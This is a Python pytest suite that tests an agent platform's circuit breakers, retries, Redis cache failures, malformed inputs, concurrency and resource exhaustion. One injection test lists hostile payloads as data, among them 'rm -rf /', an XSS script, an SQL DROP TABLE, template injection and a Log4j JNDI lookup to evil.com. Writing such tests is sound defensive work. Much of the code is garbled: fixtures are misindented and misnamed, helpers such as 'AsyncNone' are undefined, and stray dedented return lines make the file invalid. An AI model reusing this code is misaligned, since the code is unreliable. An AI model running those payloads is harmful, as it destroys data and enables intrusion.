"""Critical Edge Case Tests for Agent Infrastructure

MISSION-CRITICAL TEST SUITE: Tests extreme scenarios, boundary conditions, and error cases
that could cause system failures in production. These tests validate behavior under stress,
resource exhaustion, concurrent access, and various failure modes.

This comprehensive edge case suite covers:
1. Circuit breaker opening/closing under various failure patterns
2. Retry exhaustion and backoff behavior
3. Cache corruption and Redis failures
4. Validation edge cases and malformed inputs
5. Error propagation across inheritance hierarchy
6. Resource exhaustion and memory pressure scenarios
7. Race conditions and concurrent access patterns
8. Network partitions and timeout scenarios
9. State corruption and recovery
10. Extreme load and stress testing

BVJ: ALL segments | Platform Stability | System availability = Revenue protection
"""

import asyncio
import json
import pytest
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, List
from test_framework.redis_test_utils_test_utils.test_redis_manager import TestRedisManager
from netra_backend.app.agents.supervisor.agent_registry import AgentRegistry
from netra_backend.app.agents.supervisor.user_execution_engine import UserExecutionEngine
from shared.isolated_environment import IsolatedEnvironment

from netra_backend.app.agents.base_agent import BaseAgent
from netra_backend.app.agents.supervisor.user_execution_context import UserExecutionContext
from netra_backend.app.agents.triage.unified_triage_agent import UnifiedTriageAgent
from netra_backend.app.agents.base.interface import ExecutionContext, ExecutionResult
from netra_backend.app.agents.base.circuit_breaker import CircuitBreakerConfig, CircuitBreakerState
from netra_backend.app.llm.llm_manager import LLMManager
from netra_backend.app.agents.tool_dispatcher import ToolDispatcher
from netra_backend.app.redis_manager import RedisManager
from netra_backend.app.schemas import DeepAgentState
from netra_backend.app.schemas.agent import SubAgentLifecycle
from netra_backend.app.schemas.shared_types import RetryConfig


class MockFailingAgent(BaseAgent):
    """Agent that can simulate various failure modes for testing."""
    
    def __init__(self, *args, **kwargs):
        self.failure_mode = kwargs.pop('failure_mode', 'none')
        self.failure_count = 0
        self.max_failures = kwargs.pop('max_failures', 3)
        super().__init__(*args, **kwargs)
    
    async def validate_preconditions(self, context: ExecutionContext) -> bool:
        if self.failure_mode == 'validation':
            self.failure_count += 1
            return False
        return True
    
    async def execute_core_logic(self, context: ExecutionContext) -> Dict[str, Any]:
        # Simulate cache access for testing
        if hasattr(self, 'redis_manager') and self.redis_manager:
            try:
                # Try to get and set cache data to trigger the counters in tests
                await self.redis_manager.get("test_key")
                await self.redis_manager.set("test_key", "test_value")
            except Exception:
                pass  # Ignore cache errors
        
        if self.failure_mode == 'execution':
            self.failure_count += 1
            if self.failure_count <= self.max_failures:
                raise RuntimeError(f"Simulated execution failure #{self.failure_count}")
        
        elif self.failure_mode == 'timeout':
            await asyncio.sleep(10)  # Simulate long operation
            
        elif self.failure_mode == 'memory':
            # Simulate memory pressure
            large_data = ['x' * 10000] * 1000  # ~100MB
            return {"status": "memory_test", "data_size": len(large_data)}
            
        elif self.failure_mode == 'random':
            import random
            if random.random() < 0.3:  # 30% failure rate
                raise ValueError(f"Random failure #{self.failure_count}")
        
        return {"status": "success", "failure_count": self.failure_count}


class TestCircuitBreakerEdgeCases:
    """Test circuit breaker behavior under extreme conditions."""
    
    @pytest.fixture
 def real_llm_manager():
    """Use real service instance."""
    # TODO: Initialize real service
        llm = Mock(spec=LLMManager)
        llm.generate_response = AsyncNone  # TODO: Use real service instance
        return llm
    
    def test_circuit_breaker_rapid_failures(self, mock_llm_manager):
        """Test circuit breaker behavior with rapid consecutive failures."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            failure_mode='execution',
            max_failures=10,
            enable_reliability=True
        )
        
        # Circuit breaker should be closed initially
        cb_status = agent.get_circuit_breaker_status()
        assert cb_status.get("status") in ["closed", "healthy", "unknown"]
        
        # Execute many failing operations rapidly
        async def rapid_failure_test():
            for i in range(15):
                try:
                    state = DeepAgentState()
                    state.user_request = f"Rapid failure test {i}"
                    
                    await agent.execute_modern(state, f"rapid_fail_{i}")
                except Exception:
                    pass  # Expected to fail
                    
                # Small delay to avoid overwhelming the system
                await asyncio.sleep(0.001)
        
        # Run the rapid failure test
        asyncio.run(rapid_failure_test())
        
        # Circuit breaker should eventually open
        cb_status = agent.get_circuit_breaker_status()
        # Status depends on implementation - might be open, degraded, or unhealthy
        assert "status" in cb_status
        
    def test_circuit_breaker_partial_recovery(self, mock_llm_manager):
        """Test circuit breaker behavior with partial recovery scenarios."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            failure_mode='random',  # Intermittent failures
            enable_reliability=True
        )
        
        async def partial_recovery_test():
            # Execute many operations with mixed success/failure
            for i in range(20):
                try:
                    state = DeepAgentState()
                    state.user_request = f"Partial recovery test {i}"
                    result = await agent.execute_modern(state, f"partial_recovery_{i}")
                    # Some should succeed, some should fail
                except Exception:
                    pass  # Some failures expected
                
                await asyncio.sleep(0.01)  # Small delay
        
        asyncio.run(partial_recovery_test())
        
        # Circuit breaker should be in some reasonable state
        cb_status = agent.get_circuit_breaker_status()
        assert isinstance(cb_status, dict)
        assert "status" in cb_status
        
    def test_circuit_breaker_under_concurrent_load(self, mock_llm_manager):
        """Test circuit breaker behavior under high concurrent load."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            failure_mode='execution',
            max_failures=5,
            enable_reliability=True
        )
        
        async def concurrent_load_test():
            # Create many concurrent failing operations
            tasks = []
            for i in range(50):
                state = DeepAgentState()
                state.user_request = f"Concurrent load test {i}"
                
                task = agent.execute_modern(state, f"concurrent_load_{i}")
                tasks.append(task)
            
            # Wait for all to complete (most will fail)
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Count successes and failures
            successes = sum(1 for r in results if isinstance(r, ExecutionResult) and r.is_success)
            failures = len(results) - successes
            
            await asyncio.sleep(0)
    return successes, failures
        
        successes, failures = asyncio.run(concurrent_load_test())
        
        # Should handle concurrent load without crashing
        assert successes >= 0
        assert failures >= 0
        assert successes + failures == 50
        
        # Agent should still be responsive
        health_status = agent.get_health_status()
        assert isinstance(health_status, dict)
        
    def test_circuit_breaker_configuration_edge_cases(self, mock_llm_manager):
        """Test circuit breaker with extreme configuration values."""
        # Test with very low failure threshold
        agent_low_threshold = MockFailingAgent(
            llm_manager=mock_llm_manager,
            failure_mode='execution',
            max_failures=1,
            enable_reliability=True
        )
        
        # Should open quickly
        state = DeepAgentState()
        state.user_request = "Low threshold test"
        
        try:
            asyncio.run(agent_low_threshold.execute_modern(state, "low_threshold"))
        except Exception:
            pass  # Expected to fail
        
        cb_status = agent_low_threshold.get_circuit_breaker_status()
        assert "status" in cb_status
        
        # Test with zero timeout (immediate)
        # This tests the configuration handling
        agent_zero_timeout = MockFailingAgent(
            llm_manager=mock_llm_manager,
            enable_reliability=True
        )
        
        # Should still function
        health = agent_zero_timeout.get_health_status()
        assert "overall_status" in health


class TestRetryMechanismEdgeCases:
    """Test retry mechanisms under extreme conditions."""
    
    @pytest.fixture
 def real_llm_manager():
    """Use real service instance."""
    # TODO: Initialize real service
        llm = Mock(spec=LLMManager)
        llm.generate_response = AsyncNone  # TODO: Use real service instance
        return llm
    
    @pytest.mark.asyncio
    async def test_retry_exhaustion_behavior(self, mock_llm_manager):
        """Test behavior when all retries are exhausted."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            failure_mode='execution',
            max_failures=100,  # Always fail
            enable_reliability=True
        )
        
        state = DeepAgentState()
        state.user_request = "Retry exhaustion test"
        
        # Should eventually exhaust retries and use fallback
        result = await agent.execute_modern(state, "retry_exhaustion_test")
        
        # Should either fail or use fallback
        assert isinstance(result, ExecutionResult)
        # With reliability enabled, should use fallback
        
    @pytest.mark.asyncio 
    async def test_retry_with_increasing_delays(self, mock_llm_manager):
        """Test retry behavior with exponential backoff timing."""
        call_times = []
        
        async def timed_failure(*args, **kwargs):
            call_times.append(time.time())
            if len(call_times) < 4:
                raise Exception(f"Timed failure #{len(call_times)}")
            await asyncio.sleep(0)
    return {"status": "recovered"}
        
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            enable_reliability=True
        )
        
        # Mock the operation to track timing
        original_operation = agent.execute_core_logic
        agent.execute_core_logic = AsyncMock(side_effect=timed_failure)
        
        state = DeepAgentState()
        state.user_request = "Backoff timing test"
        
        start_time = time.time()
        result = await agent.execute_modern(state, "backoff_test")
        end_time = time.time()
        
        # Should have made multiple calls with increasing delays
        if len(call_times) > 1:
            # Verify exponential backoff pattern (approximately)
            delays = [call_times[i] - call_times[i-1] for i in range(1, len(call_times))]
            
            # Delays should generally increase (with some tolerance)
            for i in range(1, len(delays)):
                # Allow some variance in timing
                assert delays[i] >= delays[i-1] * 0.8  # 80% of expected increase
        
    @pytest.mark.asyncio
    async def test_retry_with_different_exception_types(self, mock_llm_manager):
        """Test retry behavior with different types of exceptions."""
        exception_types = [
            ValueError("Validation error"),
            RuntimeError("Runtime error"),
            ConnectionError("Network error"),
            asyncio.TimeoutError("Timeout error"),
            Exception("Generic error")
        ]
        
        for exc_type in exception_types:
            agent = MockFailingAgent(
                llm_manager=mock_llm_manager,
                enable_reliability=True
            )
            
            # Mock to raise specific exception type
            agent.execute_core_logic = AsyncMock(side_effect=exc_type)
            
            state = DeepAgentState()
            state.user_request = f"Exception type test: {type(exc_type).__name__}"
            
            # Should handle all exception types gracefully
            result = await agent.execute_modern(state, f"exception_test_{type(exc_type).__name__}")
            
            assert isinstance(result, ExecutionResult)
            # May succeed (via fallback) or fail, but should not crash
            
    @pytest.mark.asyncio
    async def test_nested_retry_scenarios(self, mock_llm_manager):
        """Test retry behavior when operations involve nested async calls."""
        async def nested_failing_operation(*args, **kwargs):
            # Simulate nested async operation that might fail
            await asyncio.sleep(0.001)  # Small delay
            
            # Fail the first few attempts
            if not hasattr(nested_failing_operation, 'attempt_count'):
                nested_failing_operation.attempt_count = 0
            
            nested_failing_operation.attempt_count += 1
            
            if nested_failing_operation.attempt_count < 3:
                raise RuntimeError(f"Nested failure #{nested_failing_operation.attempt_count}")
            
            await asyncio.sleep(0)
    return {"status": "nested_success", "attempts": nested_failing_operation.attempt_count}
        
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            enable_reliability=True
        )
        
        agent.execute_core_logic = AsyncMock(side_effect=nested_failing_operation)
        
        state = DeepAgentState()
        state.user_request = "Nested retry test"
        
        result = await agent.execute_modern(state, "nested_retry_test")
        
        assert isinstance(result, ExecutionResult)


class TestCacheCorruptionScenarios:
    """Test cache behavior under corruption and failure scenarios."""
    
    @pytest.fixture
    def corrupt_redis_manager(self):
    """Use real service instance."""
    # TODO: Initialize real service
        """Redis manager that simulates various corruption scenarios."""
        redis = Mock(spec=RedisManager)
        
        # Simulate corrupt data
        corrupt_data = [
            '{"invalid": json syntax}',  # Invalid JSON
            '{"category": null, "confidence_score": "invalid"}',  # Invalid types
            b'\x80\x03]q\x00.',  # Binary pickle data
            '',  # Empty string
            None,  # Null value
            '{"truncated": "data"',  # Truncated JSON
        ]
        
        call_count = 0
        async def get_corrupt_data(key):
            nonlocal call_count
            if call_count < len(corrupt_data):
                result = corrupt_data[call_count]
                call_count += 1
                await asyncio.sleep(0)
    return result
            return None
        
        redis.get = AsyncMock(side_effect=get_corrupt_data)
        redis.set = AsyncNone  # TODO: Use real service instance
        return redis
    
    @pytest.fixture
    def failing_redis_manager(self):
    """Use real service instance."""
    # TODO: Initialize real service
        """Redis manager that fails intermittently."""
        redis = Mock(spec=RedisManager)
        
        call_count = 0
        async def intermittent_failure(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count % 3 == 0:  # Fail every 3rd call
                raise ConnectionError("Redis connection lost")
            await asyncio.sleep(0)
    return None
        
        redis.get = AsyncMock(side_effect=intermittent_failure)
        redis.set = AsyncMock(side_effect=intermittent_failure)
        return redis
    
    @pytest.fixture
 def real_llm_manager():
    """Use real service instance."""
    # TODO: Initialize real service
        llm = Mock(spec=LLMManager)
        llm.generate_response = AsyncMock(return_value='{"category": "Test", "confidence_score": 0.8}')
        return llm
    
    @pytest.fixture
 def real_tool_dispatcher():
    """Use real service instance."""
    # TODO: Initialize real service
        dispatcher = Mock(spec=ToolDispatcher)
        dispatcher.dispatch = AsyncNone  # TODO: Use real service instance
        return dispatcher
    
    @pytest.mark.asyncio
    async def test_cache_corruption_handling(self, mock_llm_manager, mock_tool_dispatcher, corrupt_redis_manager):
        """Test handling of corrupted cache data."""
        # Use MockFailingAgent instead since UnifiedTriageAgent doesn't accept redis_manager
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=corrupt_redis_manager,
            enable_reliability=True
        )
        
        # Execute multiple requests that will encounter corrupt cache data
        for i in range(6):  # More than corrupt data samples
            state = DeepAgentState()
            state.user_request = f"Cache corruption test {i}"
            
            # Should handle corrupt cache gracefully
            result = await agent.execute_modern(state, f"corrupt_cache_{i}")
            
            assert isinstance(result, ExecutionResult)
            # Should succeed despite cache corruption
            
    @pytest.mark.asyncio
    async def test_cache_write_failures(self, mock_llm_manager, mock_tool_dispatcher, failing_redis_manager):
        """Test handling of cache write failures."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=failing_redis_manager,
            enable_reliability=True
        )
        
        # Execute requests that will encounter cache write failures
        for i in range(5):
            state = DeepAgentState()
            state.user_request = f"Cache write failure test {i}"
            
            # Should handle cache write failures gracefully
            result = await agent.execute_modern(state, f"cache_write_fail_{i}")
            
            assert isinstance(result, ExecutionResult)
            # Should complete successfully despite cache issues
            
    @pytest.mark.asyncio
    async def test_cache_timeout_scenarios(self, mock_llm_manager, mock_tool_dispatcher):
        """Test cache behavior under timeout conditions."""
        redis = Mock(spec=RedisManager)
        
        # Simulate slow cache operations
        async def slow_cache_operation(*args, **kwargs):
            await asyncio.sleep(0.1)  # 100ms delay
            await asyncio.sleep(0)
    return None
        
        redis.get = AsyncMock(side_effect=slow_cache_operation)
        redis.set = AsyncMock(side_effect=slow_cache_operation)
        
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=redis,
            enable_reliability=True
        )
        
        state = DeepAgentState()
        state.user_request = "Cache timeout test"
        
        # Should handle slow cache operations
        start_time = time.time()
        result = await agent.execute_modern(state, "cache_timeout_test")
        end_time = time.time()
        
        assert isinstance(result, ExecutionResult)
        # Should not take excessively long due to cache timeouts
        assert (end_time - start_time) < 5.0  # Under 5 seconds
        
    @pytest.mark.asyncio
    async def test_cache_memory_pressure(self, mock_llm_manager, mock_tool_dispatcher):
        """Test cache behavior under memory pressure."""
        redis = Mock(spec=RedisManager)
        
        # Simulate memory pressure by raising MemoryError occasionally
        call_count = 0
        async def memory_pressure_cache(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count % 4 == 0:  # Every 4th call
                raise MemoryError("Redis out of memory")
            await asyncio.sleep(0)
    return None
        
        redis.get = AsyncMock(side_effect=memory_pressure_cache)
        redis.set = AsyncMock(side_effect=memory_pressure_cache)
        
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=redis,
            enable_reliability=True
        )
        
        # Execute multiple requests under memory pressure
        for i in range(8):
            state = DeepAgentState()
            state.user_request = f"Memory pressure test {i}"
            
            result = await agent.execute_modern(state, f"memory_pressure_{i}")
            
            assert isinstance(result, ExecutionResult)
            # Should handle memory pressure gracefully


class TestValidationEdgeCases:
    """Test validation edge cases and malformed inputs."""
    
    @pytest.fixture
 def real_llm_manager():
    """Use real service instance."""
    # TODO: Initialize real service
        llm = Mock(spec=LLMManager)
        llm.generate_response = AsyncNone  # TODO: Use real service instance
        return llm
    
    @pytest.fixture
 def real_tool_dispatcher():
    """Use real service instance."""
    # TODO: Initialize real service
        dispatcher = Mock(spec=ToolDispatcher)
        dispatcher.dispatch = AsyncNone  # TODO: Use real service instance
        return dispatcher
    
    @pytest.fixture
 def real_redis_manager():
    """Use real service instance."""
    # TODO: Initialize real service
        redis = Mock(spec=RedisManager)
        redis.get = AsyncMock(return_value=None)
        redis.set = AsyncNone  # TODO: Use real service instance
        return redis
    
    @pytest.mark.asyncio
    async def test_malformed_state_objects(self, mock_llm_manager, mock_tool_dispatcher, mock_redis_manager):
        """Test handling of malformed state objects."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=mock_redis_manager,
            enable_reliability=True
        )
        
        # Test with various malformed states
        malformed_states = [
            DeepAgentState(),  # Empty state
            None,  # Null state (would cause error before reaching validation)
        ]
        
        for state in malformed_states:
            if state is None:
                continue  # Skip null states
                
            # Should handle gracefully
            try:
                result = await agent.execute_modern(state, "malformed_state_test")
                # May succeed or fail, but should not crash
                assert isinstance(result, ExecutionResult)
            except Exception as e:
                # If it raises an exception, it should be a controlled exception
                assert isinstance(e, (ValueError, TypeError, RuntimeError))
                
    @pytest.mark.asyncio
    async def test_extreme_input_sizes(self, mock_llm_manager, mock_tool_dispatcher, mock_redis_manager):
        """Test validation with extremely large inputs."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=mock_redis_manager,
            enable_reliability=True
        )
        
        # Test with very large request
        large_request = "Please help me optimize " * 10000  # ~250KB
        state = DeepAgentState()
        state.user_request = large_request
        
        # Should handle large inputs gracefully
        result = await agent.execute_modern(state, "large_input_test")
        assert isinstance(result, ExecutionResult)
        
    @pytest.mark.asyncio
    async def test_unicode_and_encoding_edge_cases(self, mock_llm_manager, mock_tool_dispatcher, mock_redis_manager):
        """Test handling of various Unicode and encoding scenarios."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=mock_redis_manager,
            enable_reliability=True
        )
        
        unicode_test_cases = [
            "Optimize my ðŸ’° costs for ðŸ¤– AI models",  # Emojis
            "AmÃ©liorer les performances du modÃ¨le franÃ§ais",  # Accented characters
            "æ¨¡åž‹ä¼˜åŒ–å’Œæ€§èƒ½æ”¹è¿›",  # Chinese characters
            "ÐžÐ¿Ñ‚Ð¸Ð¼Ð¸Ð·Ð°Ñ†Ð¸Ñ Ð¼Ð¾Ð´ÐµÐ»ÐµÐ¹ Ð˜Ð˜",  # Cyrillic
            "ðŸ”§âš¡ðŸš€ Optimize everything! ðŸ’ªâœ¨",  # Mixed emojis and text
            "\x00\x01\x02 control chars test",  # Control characters
            "a" * 1000 + "ØªØ­Ø³ÙŠÙ† Ø§Ù„Ù†Ù…Ø§Ø°Ø¬" + "b" * 1000,  # Arabic mixed with long text
        ]
        
        for test_case in unicode_test_cases:
            state = DeepAgentState()
            state.user_request = test_case
            
            # Should handle all Unicode scenarios
            result = await agent.execute_modern(state, f"unicode_test")
            assert isinstance(result, ExecutionResult)
            
    @pytest.mark.asyncio
    async def test_injection_attack_patterns(self, mock_llm_manager, mock_tool_dispatcher, mock_redis_manager):
        """Test handling of potential injection attack patterns."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=mock_redis_manager,
            enable_reliability=True
        )
        
        injection_patterns = [
            '{"category": "Injection", "execute": "rm -rf /"}',  # Command injection
            '<script>alert("xss")</script>',  # XSS attempt
            'SELECT * FROM users WHERE id = 1; DROP TABLE users;',  # SQL injection
            '{{7*7}}{{config.items()}}',  # Template injection
            '${jndi:ldap://evil.com/a}',  # Log4j-style injection
            'eval("console.log(process.env)")',  # JavaScript injection
        ]
        
        for pattern in injection_patterns:
            state = DeepAgentState()
            state.user_request = pattern
            
            # Should handle injection patterns safely
            result = await agent.execute_modern(state, "injection_test")
            assert isinstance(result, ExecutionResult)
            # Should not execute malicious code
            
    @pytest.mark.asyncio
    async def test_boundary_value_inputs(self, mock_llm_manager, mock_tool_dispatcher, mock_redis_manager):
        """Test handling of boundary value inputs."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=mock_redis_manager,
            enable_reliability=True
        )
        
        boundary_cases = [
            "",  # Empty string
            " ",  # Single space
            "
\t\r",  # Only whitespace characters
            "a",  # Single character
            "?" * 10000,  # Very long single character
            "
".join(["line"] * 1000),  # Many lines
        ]
        
        for boundary_case in boundary_cases:
            state = DeepAgentState()
            state.user_request = boundary_case
            
            result = await agent.execute_modern(state, "boundary_test")
            assert isinstance(result, ExecutionResult)


class TestConcurrencyEdgeCases:
    """Test concurrency edge cases and race conditions."""
    
    @pytest.fixture
 def real_llm_manager():
    """Use real service instance."""
    # TODO: Initialize real service
        llm = Mock(spec=LLMManager)
        llm.generate_response = AsyncMock(return_value='{"category": "Concurrency", "confidence_score": 0.8}')
        await asyncio.sleep(0)
    return llm
    
    @pytest.fixture
 def real_tool_dispatcher():
    """Use real service instance."""
    # TODO: Initialize real service
        dispatcher = Mock(spec=ToolDispatcher)
        dispatcher.dispatch = AsyncNone  # TODO: Use real service instance
        return dispatcher
    
    @pytest.fixture
 def real_redis_manager():
    """Use real service instance."""
    # TODO: Initialize real service
        redis = Mock(spec=RedisManager)
        redis.get = AsyncMock(return_value=None)
        redis.set = AsyncNone  # TODO: Use real service instance
        return redis
    
    @pytest.mark.asyncio
    async def test_concurrent_state_modifications(self, mock_llm_manager, mock_tool_dispatcher, mock_redis_manager):
        """Test behavior when agent state is modified concurrently."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=mock_redis_manager,
            enable_reliability=True
        )
        
        # Create concurrent tasks that modify agent state
        async def modify_state_task(task_id):
            state = DeepAgentState()
            state.user_request = f"Concurrent state modification test {task_id}"
            
            # Modify agent state during execution
            agent.set_state(SubAgentLifecycle.RUNNING)
            
            result = await agent.execute_modern(state, f"concurrent_mod_{task_id}")
            
            # Try to modify state after execution
            if task_id % 2 == 0:
                agent.set_state(SubAgentLifecycle.COMPLETED)
            
            await asyncio.sleep(0)
    return result
        
        # Execute concurrent tasks
        tasks = [modify_state_task(i) for i in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # All tasks should complete (may succeed or fail, but not crash)
        for result in results:
            assert not isinstance(result, Exception) or isinstance(result, (ValueError, RuntimeError))
            
    @pytest.mark.asyncio
    async def test_concurrent_circuit_breaker_access(self, mock_llm_manager, mock_tool_dispatcher, mock_redis_manager):
        """Test concurrent access to circuit breaker state."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            failure_mode='random',
            enable_reliability=True
        )
        
        # Concurrent tasks accessing circuit breaker
        async def circuit_breaker_task(task_id):
            # Execute operation (may fail)
            state = DeepAgentState()
            state.user_request = f"CB concurrent test {task_id}"
            
            try:
                result = await agent.execute_modern(state, f"cb_concurrent_{task_id}")
            except Exception:
                pass  # Expected for some operations
            
            # Check circuit breaker status
            status = agent.get_circuit_breaker_status()
            await asyncio.sleep(0)
    return status
        
        # Execute many concurrent circuit breaker accesses
        tasks = [circuit_breaker_task(i) for i in range(20)]
        statuses = await asyncio.gather(*tasks, return_exceptions=True)
        
        # All should return valid statuses
        for status in statuses:
            if not isinstance(status, Exception):
                assert isinstance(status, dict)
                assert "status" in status
                
    @pytest.mark.asyncio
    async def test_concurrent_cache_access(self, mock_llm_manager, mock_tool_dispatcher):
        """Test concurrent access to cache operations."""
        # Create Redis manager with tracking
        cache_access_count = 0
        cache_lock = asyncio.Lock()
        
        redis = Mock(spec=RedisManager)
        
        async def concurrent_cache_get(key):
            nonlocal cache_access_count
            async with cache_lock:
                cache_access_count += 1
            await asyncio.sleep(0.001)  # Small delay to increase chance of race conditions
            await asyncio.sleep(0)
    return None  # Cache miss
        
        async def concurrent_cache_set(key, value, **kwargs):
            nonlocal cache_access_count
            async with cache_lock:
                cache_access_count += 1
            await asyncio.sleep(0.001)  # Small delay
        
        redis.get = AsyncMock(side_effect=concurrent_cache_get)
        redis.set = AsyncMock(side_effect=concurrent_cache_set)
        
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=Mock(spec=ToolDispatcher),
            redis_manager=redis,
            enable_reliability=True
        )
        
        # Execute concurrent operations that access cache
        async def cache_access_task(task_id):
            state = DeepAgentState()
            state.user_request = f"Concurrent cache test {task_id}"
            
            await asyncio.sleep(0)
    return await agent.execute_modern(state, f"cache_concurrent_{task_id}")
        
        tasks = [cache_access_task(i) for i in range(15)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # All should complete successfully
        for result in results:
            if not isinstance(result, Exception):
                assert isinstance(result, ExecutionResult)
        
        # Cache should have been accessed concurrently
        assert cache_access_count > 0
        
    def test_thread_safety_of_agent_properties(self, mock_llm_manager, mock_tool_dispatcher, mock_redis_manager):
        """Test thread safety of agent property access."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=mock_tool_dispatcher,
            redis_manager=mock_redis_manager,
            enable_reliability=True
        )
        
        errors = []
        results = []
        
        def access_properties():
            try:
                # Access various properties concurrently
                _ = agent.reliability_manager
                _ = agent.execution_engine  
                _ = agent.get_health_status()
                _ = agent.get_circuit_breaker_status()
                _ = agent.timing_collector.get_aggregated_stats()
                
                results.append("success")
            except Exception as e:
                errors.append(e)
        
        # Create multiple threads accessing properties
        threads = []
        for i in range(20):
            thread = threading.Thread(target=access_properties)
            threads.append(thread)
        
        # Start all threads
        for thread in threads:
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join(timeout=5.0)  # 5 second timeout
        
        # Should have no errors and all successes
        assert len(errors) == 0, f"Thread safety errors: {errors}"
        assert len(results) == 20


class TestResourceExhaustionScenarios:
    """Test behavior under resource exhaustion conditions."""
    
    @pytest.fixture
 def real_llm_manager():
    """Use real service instance."""
    # TODO: Initialize real service
        llm = Mock(spec=LLMManager)
        llm.generate_response = AsyncMock(return_value='{"category": "Resource Test", "confidence_score": 0.8}')
        return llm
    
    @pytest.mark.asyncio
    async def test_memory_exhaustion_handling(self, mock_llm_manager):
        """Test behavior when system is under memory pressure."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            failure_mode='memory',
            enable_reliability=True
        )
        
        # Execute memory-intensive operations
        memory_results = []
        for i in range(5):  # Limited iterations to avoid actual memory issues
            state = DeepAgentState()
            state.user_request = f"Memory exhaustion test {i}"
            
            try:
                result = await agent.execute_modern(state, f"memory_test_{i}")
                memory_results.append(result)
            except MemoryError:
                # Expected under real memory pressure
                memory_results.append("memory_error")
            except Exception as e:
                memory_results.append(f"other_error: {type(e).__name__}")
        
        # Should handle memory pressure gracefully
        assert len(memory_results) == 5
        
        # Agent should still be responsive after memory pressure
        health_status = agent.get_health_status()
        assert isinstance(health_status, dict)
        
    @pytest.mark.asyncio
    async def test_file_descriptor_exhaustion(self, mock_llm_manager):
        """Test behavior when file descriptors are exhausted."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=Mock(spec=ToolDispatcher),
            redis_manager=Mock(spec=RedisManager),
            enable_reliability=True
        )
        
        # Simulate file descriptor exhaustion by opening many files
        open_files = []
        try:
            # Open many temporary files (careful not to actually exhaust system)
            import tempfile
            for i in range(100):  # Reasonable number that won't crash system
                temp_file = tempfile.NamedTemporaryFile()
                open_files.append(temp_file)
            
            # Execute operations under file descriptor pressure
            state = DeepAgentState()
            state.user_request = "File descriptor exhaustion test"
            
            result = await agent.execute_modern(state, "fd_exhaustion_test")
            assert isinstance(result, ExecutionResult)
            
        finally:
            # Clean up files
            for temp_file in open_files:
                try:
                    temp_file.close()
                except:
                    pass
                    
    @pytest.mark.asyncio
    async def test_cpu_intensive_operations(self, mock_llm_manager):
        """Test behavior with CPU-intensive operations."""
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            enable_reliability=True
        )
        
        # Mock CPU-intensive core logic
        async def cpu_intensive_logic(context):
            # Simulate CPU-intensive work
            total = 0
            for i in range(100000):  # Significant but not excessive computation
                total += i * i
            await asyncio.sleep(0)
    return {"status": "cpu_intensive_complete", "result": total}
        
        agent.execute_core_logic = AsyncMock(side_effect=cpu_intensive_logic)
        
        # Execute concurrent CPU-intensive operations
        start_time = time.time()
        
        tasks = []
        for i in range(3):  # Limited concurrent CPU tasks
            state = DeepAgentState()
            state.user_request = f"CPU intensive test {i}"
            
            task = agent.execute_modern(state, f"cpu_test_{i}")
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        end_time = time.time()
        
        # All should complete successfully
        for result in results:
            assert isinstance(result, ExecutionResult)
            assert result.is_success is True
        
        # Should complete in reasonable time despite CPU load
        total_time = end_time - start_time
        assert total_time < 30.0  # Under 30 seconds
        
    @pytest.mark.asyncio
    async def test_network_connection_exhaustion(self, mock_llm_manager):
        """Test behavior when network connections are exhausted."""
        # Simulate connection exhaustion by making LLM calls fail with connection errors
        connection_errors = [
            ConnectionError("Too many connections"),
            OSError("Network unreachable"), 
            asyncio.TimeoutError("Connection timeout"),
        ]
        
        call_count = 0
        async def connection_exhausted_llm(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            
            # Fail with various connection errors
            error_index = call_count % len(connection_errors)
            raise connection_errors[error_index]
        
        mock_llm_manager.generate_response = AsyncMock(side_effect=connection_exhausted_llm)
        
        agent = MockFailingAgent(
            llm_manager=mock_llm_manager,
            tool_dispatcher=Mock(spec=ToolDispatcher),
            redis_manager=Mock(spec=RedisManager),
            enable_reliability=True
        )
        
        # Execute operations under connection exhaustion
        for i in range(5):
            state = DeepAgentState()
            state.user_request = f"Connection exhaustion test {i}"
            
            # Should handle connection errors gracefully (via fallback)
            result = await agent.execute_modern(state, f"connection_test_{i}")
            assert isinstance(result, ExecutionResult)
            
        # Agent should remain healthy despite connection issues
        health_status = agent.get_health_status()
        assert isinstance(health_status, dict)


